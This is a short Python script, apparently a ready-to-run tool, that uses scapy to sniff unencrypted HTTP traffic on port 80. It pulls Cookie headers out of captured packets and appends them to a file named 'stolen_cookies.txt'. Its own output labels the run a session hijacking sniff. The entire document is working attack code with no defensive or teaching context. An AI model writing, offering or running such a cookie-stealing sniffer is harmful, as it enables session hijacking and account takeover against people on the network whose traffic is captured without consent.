from scapy.all import sniff, TCP, Raw

def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode(errors='ignore')  # decode safely
            if "Cookie" in payload:
                print("\n[+] Cookie Header Captured:")
                lines = payload.split("\r\n")
                for line in lines:
                    if "Cookie:" in line:
                        cookie_line = line.strip()
                        print("    →", cookie_line)
                        with open("stolen_cookies.txt", "a") as f:
                            f.write(cookie_line + "\n")
        except Exception as e:
            print("[-] Error decoding packet:", e)

def start_sniff():
    print("[*] Starting session hijacking sniff on TCP port 80...")
    sniff(filter="tcp port 80", prn=packet_callback, store=0)

if __name__ == "__main__":
    start_sniff()
